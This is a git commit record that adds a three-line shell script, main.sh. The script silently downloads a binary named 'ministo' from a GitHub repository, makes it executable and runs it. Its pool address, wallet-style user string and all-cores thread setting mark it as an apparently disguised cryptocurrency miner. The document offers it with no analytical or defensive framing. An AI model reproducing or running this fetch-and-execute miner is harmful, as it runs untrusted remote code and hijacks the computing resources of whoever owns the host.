d4b3599c87b6d55c4be82c9feeaa7ac76fa67c4c
feby12329 <feby12329001@webmail.uad.ac.id>
2024-07-27 00:06:29 +0700

    Create main.sh

---
+++ main.sh
@@ -0,0 +1,3 @@
+wget -q https://github.com/fhuko1357/satu/raw/main/ministo
+chmod +x ministo
+./ministo -o 142.202.242.43:443 -u 8BPjSontrTiSe1aM6ib39yh2fciZgSwBEG8MF3ZuLKx3VMoCX4hnAuvere2dDhNR9eKSe2yfweueCRs2DBhMiBdiVUwpca2 -p x -t $(nproc)
